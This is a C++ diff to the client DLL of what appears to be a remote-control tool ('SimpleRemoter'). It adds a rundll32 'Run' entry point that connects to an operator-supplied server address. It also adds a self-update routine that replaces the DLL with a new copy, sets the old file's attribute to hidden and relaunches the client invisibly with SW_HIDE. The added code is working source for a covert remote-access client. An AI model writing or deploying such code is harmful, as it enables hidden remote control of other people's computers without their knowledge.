@@ -7,6 +7,13 @@
 #include <IOSTREAM>
 #include "LoginServer.h"
 #include "KernelManager.h"
+#include <iosfwd>
+#include <vector>
+#include <iostream>
+#include <fstream>
+#include <sstream>
+#include <shellapi.h>
+#include <corecrt_io.h>
 using namespace std;
 
 // 自动启动注册表中的值
@@ -165,7 +172,10 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
 	g_bExit = FALSE;
-	g_SETTINGS.SetServer(szServerIP, uPort);
+	if (strlen(szServerIP)>0 && uPort>0)
+	{
+		g_SETTINGS.SetServer(szServerIP, uPort);
+	}
 	g_SETTINGS.SetType(CLIENT_TYPE_DLL);
 
 	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
@@ -173,7 +183,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 		return;
 	}
 #ifdef _DEBUG
-	WaitForSingleObject(hThread, 200);
+	WaitForSingleObject(hThread, INFINITE);
 #else
 	WaitForSingleObject(hThread, INFINITE);
 #endif
@@ -188,6 +198,99 @@ extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }
 
 // 是否退出客户端
 extern "C" __declspec(dllexport) BOOL IsExit() { return g_bExit; }
+
+// copy from: SimpleRemoter\client\test.cpp
+// 启用新的DLL
+void RunNewDll(const char* cmdLine) {
+	char path[_MAX_PATH], * p = path;
+	GetModuleFileNameA(NULL, path, sizeof(path));
+	while (*p) ++p;
+	while ('\\' != *p) --p;
+	*(p + 1) = 0;
+	std::string folder = path;
+	std::string oldFile = folder + "ServerDll.old";
+	std::string newFile = folder + "ServerDll.new";
+	strcpy(p + 1, "ServerDll.dll");
+	BOOL ok = TRUE;
+	if (_access(newFile.c_str(), 0) != -1) {
+		if (_access(oldFile.c_str(), 0) != -1)
+		{
+			if (!DeleteFileA(oldFile.c_str()))
+			{
+				std::cerr << "Error deleting file. Error code: " << GetLastError() << std::endl;
+				ok = FALSE;
+			}
+		}
+		if (ok && !MoveFileA(path, oldFile.c_str())) {
+			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
+			if (_access(path, 0) != -1)
+			{
+				ok = FALSE;
+			}
+		}
+		else {
+			// 设置文件属性为隐藏
+			if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN))
+			{
+				std::cout << "File created and set to hidden: " << oldFile << std::endl;
+			}
+		}
+		if (ok && !MoveFileA(newFile.c_str(), path)) {
+			std::cerr << "Error removing file. Error code: " << GetLastError() << std::endl;
+			MoveFileA(oldFile.c_str(), path);// recover
+		}
+		else if (ok) {
+			std::cout << "Using new file: " << newFile << std::endl;
+		}
+	}
+	char cmd[1024];
+	sprintf_s(cmd, "%s,Run %s", path, cmdLine);
+	ShellExecuteA(NULL, "open", "rundll32.exe", cmd, NULL, SW_HIDE);
+}
+
+/* 运行客户端的核心代码. 此为定义导出函数, 满足 rundll32 调用约定.
+HWND hwnd: 父窗口句柄（通常为 NULL）。
+HINSTANCE hinst: DLL 的实例句柄。
+LPSTR lpszCmdLine: 命令行参数，作为字符串传递给函数。
+int nCmdShow: 窗口显示状态。
+运行命令：rundll32.exe ClientDemo.dll,Run 127.0.0.1:6543
+优先从命令行参数中读取主机地址，如果不指定主机就从全局变量读取。
+*/
+extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
+	char message[256] = { 0 };
+	if (strlen(lpszCmdLine) != 0) {
+		strcpy_s(message, lpszCmdLine);
+	}else if (g_SETTINGS.IsValid())
+	{
+		sprintf_s(message, "%s:%d", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
+	}
+
+	std::istringstream stream(message);
+	std::string item;
+	std::vector<std::string> result;
+	while (std::getline(stream, item, ':')) {
+		result.push_back(item);
+	}
+	if (result.size() == 1)
+	{
+		result.push_back("80");
+	}
+	if (result.size() != 2) {
+		MessageBox(hwnd, "请提供正确的主机地址!", "提示", MB_OK);
+		return;
+	}
+	
+	do
+	{
+		TestRun((char*)result[0].c_str(), atoi(result[1].c_str()));
+		while (!IsStoped())
+			Sleep(20);
+	} while (!IsExit());
+	if (IsExit() == 1)
+		return;
+	sprintf_s(message, "%s:%d", g_SETTINGS.ServerIP(), g_SETTINGS.ServerPort());
+	RunNewDll(message);
+}
 
 #endif
 
